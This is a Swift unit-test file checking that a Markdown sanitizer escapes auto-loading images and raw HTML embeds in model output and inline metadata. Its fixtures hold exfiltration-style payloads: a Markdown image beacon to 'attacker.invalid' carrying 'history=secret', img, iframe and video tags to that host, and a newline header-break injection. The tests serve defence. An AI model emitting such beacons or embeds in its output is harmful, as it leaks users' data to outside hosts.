import XCTest

final class AutomationMarkdownSafetyTests: XCTestCase {
    func testModelOutputNeutralizesAutoloadingMarkdownAndRawHTML() {
        let malicious = """
        ## Work
        ![stolen](https://attacker.invalid/pixel?history=secret)
        <img src="https://attacker.invalid/raw">
        <iframe src="https://attacker.invalid/frame"></iframe>
        <video poster="https://attacker.invalid/poster"></video>
        """

        let output = AutomationMarkdownSafety.modelOutput(malicious)

        XCTAssertTrue(output.contains("## Work"), "ordinary Markdown should remain readable")
        XCTAssertTrue(output.contains(#"\![stolen](https://attacker.invalid/pixel?history=secret)"#))
        XCTAssertFalse(output.contains("<img"))
        XCTAssertFalse(output.contains("<iframe"))
        XCTAssertFalse(output.contains("<video"))
        XCTAssertTrue(output.contains("&lt;img"))
    }

    func testInlineMetadataCannotBreakTheHeaderOrCreateAnEmbed() {
        let malicious = "provider\n![pixel](https://attacker.invalid/p) <img src=x>"

        let output = AutomationMarkdownSafety.inlineMetadata(malicious)

        XCTAssertFalse(output.contains("\n"))
        XCTAssertFalse(output.contains("<img"))
        XCTAssertTrue(output.contains(#"\![pixel]"#))
        XCTAssertTrue(output.contains("&lt;img"))
    }
}
